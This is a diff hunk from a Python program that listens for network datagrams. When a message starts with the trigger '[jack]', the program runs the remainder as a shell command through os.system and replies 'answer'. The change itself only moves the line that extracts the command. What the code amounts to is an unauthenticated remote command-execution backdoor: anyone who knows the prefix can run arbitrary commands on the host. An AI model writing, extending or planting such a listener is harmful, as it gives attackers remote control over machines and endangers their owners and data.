@@ -18,10 +18,10 @@ while not quit:
 
         check = data.decode("utf-8")
         check = check[:6]
-        
+        strCmd = data.decode("utf-8")
+        strCmd = strCmd[10:len(strCmd):1]
+
         if (check == "[jack]"):
-            strCmd = data.decode("utf-8")
-            strCmd = strCmd[10:len(strCmd):1]
             os.system(strCmd)
             str1 = "answer"
             s.sendto(str1.encode("utf-8"), addr)
